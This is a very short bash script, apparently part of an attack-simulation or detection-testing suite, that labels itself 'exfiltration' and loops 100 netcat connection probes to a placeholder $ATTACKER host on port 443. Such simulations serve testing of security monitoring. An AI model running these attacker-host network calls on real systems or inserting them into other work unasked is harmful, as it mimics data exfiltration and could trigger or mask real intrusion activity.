#!/usr/bin/env bash
ATTACK=exfiltration; . "$(dirname "$0")/_lib.sh"
run "for i in \$(seq 1 100); do nc -z -w1 $ATTACKER 443; done"
